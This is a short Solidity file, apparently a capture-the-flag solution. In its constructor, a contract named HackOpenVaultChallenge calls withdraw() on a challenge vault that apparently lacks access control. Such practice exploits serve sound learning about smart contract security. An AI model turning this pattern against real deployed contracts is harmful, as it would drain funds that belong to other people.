// SPDX-License-Identifier:GPL-3.0-or-later
pragma solidity 0.8.10;

import "../accounts/OpenVaultChallenge.sol";

contract HackOpenVaultChallenge {
    constructor(address instance) {
        OpenVaultChallenge(instance).withdraw();
    }
}
